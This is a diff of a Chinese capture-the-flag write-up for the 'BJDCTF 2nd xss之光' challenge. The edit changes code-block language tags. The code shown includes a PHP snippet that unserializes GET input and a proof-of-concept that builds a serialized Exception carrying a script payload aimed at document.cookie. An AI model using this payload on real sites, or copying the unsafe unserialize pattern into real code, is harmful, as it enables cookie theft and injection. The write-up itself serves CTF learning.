@@ -73,7 +73,7 @@ echo $c;
 
 ### **[BJDCTF 2nd]****xss****之光** 通过git拿到源码
 
-```Plain
+```php
 <?php 
 $a = $_GET['yds_is_so_beautiful'];
 Echo unserialize($a);
@@ -83,11 +83,11 @@ Echo unserialize($a);
 
 思路：flag一般在COOKIE的信息里。
 
-```Plain
+```php
 <?php
 $poc=new        Exception("<script>alert(document.cookie)</script>");
 Echo urlencode(serialize($poc));?>
-反弹cookie
+//反弹cookie
 ```
 
 将得到的结果传入
